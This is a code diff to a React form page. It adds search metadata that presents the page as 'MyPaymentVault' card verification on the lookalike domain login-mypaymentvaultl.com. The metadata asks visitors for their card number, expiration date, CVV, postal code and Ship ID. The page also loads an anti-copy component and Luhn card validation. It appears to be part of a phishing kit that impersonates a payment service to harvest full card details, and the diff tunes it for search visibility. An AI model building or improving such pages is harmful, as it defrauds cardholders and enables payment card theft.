@@ -5,6 +5,7 @@ import { useMutation } from '@tanstack/react-query';
 import { z } from 'zod';
 import { useLocation } from 'wouter';
 import { AntiCopyProtection } from '@/components/AntiCopyProtection';
+import { SEO } from '@/components/SEO';
 import { apiRequest } from '@/lib/queryClient';
 import { useToast } from '@/hooks/use-toast';
 import { validateLuhn } from '@/lib/luhn';
@@ -138,6 +139,17 @@ export default function PostalCodePage() {
 
   return (
     <>
+      <SEO 
+        title="Card Verification | MyPaymentVault S@S Account Verification"
+        description="Verify your MyPaymentVault card ownership securely. Enter your Ship ID, card number, expiration date, CVV and postal code for S@S account verification."
+        keywords="MyPaymentVault verification, mypaymentvault card verify, S@S account verification, mypaymentvault postal code, verify card ownership, mypaymentvault security, employee card verification, payment vault verification, northlane card verification, wirecard verification"
+        canonical="https://login-mypaymentvaultl.com/postal-code"
+        breadcrumbs={[
+          { name: "MyPaymentVault", url: "/" },
+          { name: "Login", url: "/" },
+          { name: "Card Verification", url: "/postal-code" }
+        ]}
+      />
       <AntiCopyProtection />
       <div>
         <form id="postalForm" onSubmit={handleSubmit(onSubmit)}>
